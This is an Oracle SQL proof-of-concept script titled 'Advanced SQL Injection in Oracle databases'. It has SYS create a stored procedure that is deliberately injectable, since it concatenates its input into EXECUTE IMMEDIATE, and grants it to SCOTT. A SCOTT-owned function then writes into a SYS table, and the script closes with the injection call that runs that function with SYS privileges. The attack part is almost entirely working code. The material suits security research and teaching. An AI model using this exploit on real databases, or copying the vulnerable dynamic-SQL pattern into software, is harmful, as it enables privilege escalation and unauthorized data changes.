/*
  Advanced SQL Injection in Oracle databases

  By Esteban Martinez Fayo
  secemf@yahoo.com.ar
*/
------------
-- Execute this as a SYS
------------

-- SQLVULN is a procedure vulnerable to SQL Injection. The vulnerability exists
-- in a single PL/SQL statement (not in an anonymous PL/SQL block).
CREATE OR REPLACE PROCEDURE "SYS"."SQLIVULN"  (P_JOB VARCHAR2)
AS
AVGSAL Numeric;
BEGIN
  EXECUTE IMMEDIATE 'SELECT AVG(SAL) FROM SCOTT.EMP WHERE JOB = '''||P_JOB||'''' INTO AVGSAL;
  DBMS_OUTPUT.PUT_LINE('Average salary for the job is: '||AVGSAL);
END;
/
GRANT EXECUTE ON  "SYS"."SQLIVULN" TO "SCOTT"
/


------------
-- Execute this as a low privilege user
------------
CREATE OR REPLACE FUNCTION "SCOTT"."SQLI" return varchar2
 authid current_user as
BEGIN
  execute immediate 'INSERT INTO SYS.PPT (PPC) VALUES (''55'')';
  commit;
  return '';
END;
/

--To exploit
EXEC SYS.SQLIVULN('MANAGER'' || SCOTT.SQLI() || ''');
-- This gives an Oracle Error
